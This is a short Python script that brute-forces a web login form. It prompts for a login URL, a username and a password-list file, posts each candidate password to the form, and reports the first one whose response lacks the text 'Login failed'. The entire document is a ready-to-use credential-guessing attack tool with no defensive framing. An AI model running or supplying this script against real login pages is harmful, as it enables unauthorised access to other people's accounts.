#!/usr/bin/python3
import requests
def bruteforcelogin(username,url):
	for password in passwords:
		password= password.strip()
		print("[!!] Trying To Brute Force With " + password)
		data_dict= {"username":username,"password":password,"login":"submit"}
		resp=requests.post(url,data=data_dict)
		if b"Login failed" in resp.content:
			print(resp.text)
			
		else:
			print("Password Found : "+ password)
			exit()

page_url=input("Enter The Login Page URL: \n=>")
username=input("Enter The Username For Login: \n=>")
file=input("Enter The Full Path of Password List if it is not in The Same Directory of The Script:\n=>")
with open(file,"r") as passwords:
	bruteforcelogin(username,page_url)